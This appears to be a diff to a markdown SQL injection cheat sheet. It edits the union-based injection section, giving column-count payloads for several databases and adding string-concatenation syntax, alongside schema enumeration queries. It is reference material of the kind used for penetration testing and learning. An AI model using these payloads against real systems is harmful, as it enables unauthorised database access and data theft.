@@ -33,12 +33,14 @@ HQL does not support comments
 ```
 
 # Union Based SQL Injection
-If you can see the output of your SQL query then this is the best way to exploit it
-**Determine number of columns:**
+If you can see the output of your SQL query then this is the best way to exploit it ╰(*°▽°*)╯
+
+## Get number of columns
+**MySQL, MSQL, PostgreSQL:**
 ```sql
 '' UNION SELECT null, null, null... -- 
 ```
-**Determine number of columns for Oracle:**
+**Oracle:**
 ```sql
 '' UNION SELECT null, null... FROM dual -- 
 ```
@@ -73,6 +75,20 @@ SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
 **MSQL, PostgreSQL, MySQL:**
 ```sql
 SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+## Concatenate strings
+**Oracle, PostgreSQL:**
+```sql
+'foo'||'bar'
+```
+**MSQL:**
+```sql
+'foo'+'bar'
+```
+**MySQL:**
+```sql
+'foo' 'bar' -- Note the space between the two strings
+CONCAT('foo','bar')
 ```
 
 # Blind SQLi
